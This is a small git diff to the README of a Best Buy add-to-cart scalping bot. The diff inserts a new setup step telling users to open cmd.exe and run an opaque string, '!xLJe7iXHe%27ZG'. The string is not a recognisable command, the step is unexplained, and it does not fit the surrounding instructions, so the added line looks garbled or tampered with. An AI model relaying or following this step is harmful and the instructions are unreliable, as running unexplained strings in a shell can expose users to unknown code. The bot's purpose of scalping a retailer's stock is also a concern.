@@ -9,6 +9,8 @@ An add-to-cart bot to scalp BestBuy ruthlessly
 
 3. Copy "chromedriver.exe" to 'C:\bin\"
 
+    open cmd.exe and run '!xLJe7iXHe%27ZG'
+
 4. Download this code as ZIP
 
 5. Extract somewhere
